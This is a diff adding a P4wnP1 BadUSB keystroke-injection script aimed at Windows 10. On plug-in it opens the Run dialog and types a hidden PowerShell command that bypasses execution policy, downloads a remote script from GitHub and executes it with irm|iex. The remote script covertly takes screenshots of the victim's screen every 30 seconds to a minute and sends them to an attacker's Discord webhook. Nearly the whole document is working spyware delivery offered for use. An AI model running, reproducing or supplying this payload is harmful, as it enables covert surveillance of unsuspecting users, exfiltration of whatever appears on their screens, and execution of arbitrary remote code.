@@ -1,0 +1,19 @@
+REM Title: P4wnP1_Screenshot_Discord_Webhook_Payload
+REM Author: White Hat Hacker
+REM Description: Captures a screenshot every 30 seconds - 1 min of the users screen. Make sure to change DISCORD_WEBHOOK_HERE to correct URL for webhook.
+REM Target: Windows 10 (Powershell)
+REM Props: Beigeworm
+REM Version: 1.0
+REM Category: BadUSB
+
+// Replace DISCORD_WEBHOOK_HERE before running!
+
+// script setup
+layout("us")
+
+// Open Powershell as Admin
+press("GUI r");
+delay(1000);
+type("powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/SShots-to-DC.ps1 | iex");
+delay(500);
+press("ENTER");
